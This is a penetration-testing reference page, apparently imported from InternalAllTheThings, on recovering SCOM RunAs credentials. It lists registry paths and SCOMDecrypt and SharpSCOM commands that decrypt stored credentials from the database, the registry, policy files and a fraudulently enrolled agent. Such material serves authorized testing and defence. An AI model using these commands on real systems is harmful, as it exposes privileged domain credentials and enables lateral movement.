---
title: Deployment - SCOM
type: technique
tags: [active-directory, reference-import, scom, windows]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Deployment - SCOM

## What it is

> Microsoft SCOM (System Center Operations Manager) is a monitoring tool used to oversee the health and performance of servers, applications, and infrastructure in IT environments. It collects data from systems, generates alerts for issues, and provides dashboards and reports for administrators.

## How it works

SCOM stores `RunAs` credentials in its management server database, encrypted with a key derived from the SCOM service account. Attackers who compromise the SCOM management server or its database can use tools like SCOMDecrypt to extract the plaintext RunAs account credentials, which are often domain service accounts with elevated permissions on monitored systems. Because SCOM agents run on nearly every server in the environment and the RunAs accounts must have permissions to collect metrics, these credentials frequently represent a significant lateral movement opportunity.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

> Microsoft SCOM (System Center Operations Manager) is a monitoring tool used to oversee the health and performance of servers, applications, and infrastructure in IT environments. It collects data from systems, generates alerts for issues, and provides dashboards and reports for administrators.

## Tools

* [breakfix/SharpSCOM](https://github.com/breakfix/SharpSCOM) - A C# utility for interacting with SCOM.
* [nccgroup/SCOMDecrypt](https://github.com/nccgroup/SCOMDecrypt) - SCOMDecrypt is a tool to decrypt stored RunAs credentials from SCOM servers.

## SCOM “RunAs” credentials

### Recovery from SCOM database

The location of the SCOM database containing the RunAs credentials can be found by querying the following registry keys:

```ps1
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseServerName
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseName
```

Decrypt the stored credentials stored inside the SCOM management server database:

```ps1
.\SCOMDecrypt.exe
powershell-import C:\path\to\SCOMDecrypt.ps1
powershell Invoke-SCOMDecrypt
```

### Recovery via Registry

Stored at `HKLM\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\$MANAGEMENT_GROUP$\SSDB\SSIDs\`.

```ps1
.\SharpSCOM.exe DecryptRunAs
```

### Recovery via Policy File

Use DPAPI to decrypt the RunAs credential from the policy.

```ps1
cat C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Connector Configuration Cache\$MANAGEMENT_GROUP_NAME$\OpsMgrConnector.Config
SharpSCOM DecryptPolicy /data:<base64-encrypted-data>
```

### Recovery after enrolling a new agent

**Requirements**:

* Management group name: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\*`

```ps1
SharpSCOM.exe autoenroll /managementgroup:SCOM1 /server:scom.domain.lab /hostname:fake1.domain.lab /outfile:C:\Users\admin\desktop\policy_new.xml

# After enrolling a new agent, the attacker can decrypt the policy
SharpSCOM.exe decryptpolicy /data:"DAEAAA<REDACTED> /key:<RSAKeyValue><Modulus><REDACTED></D></RSAKeyValue>
```

## References

* [SCOMmand And Conquer – Attacking System Center Operations Manager (Part 2) - Matt Johnson - December 10, 2025](https://specterops.io/blog/2025/12/10/scommand-and-conquer-attacking-system-center-operations-manager-part-2/)
* [SCOMplicated? – Decrypting SCOM “RunAs” credentials - Rich Warren - February 23, 2017](https://www.nccgroup.com/research-blog/scomplicated-decrypting-scom-runas-credentials/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
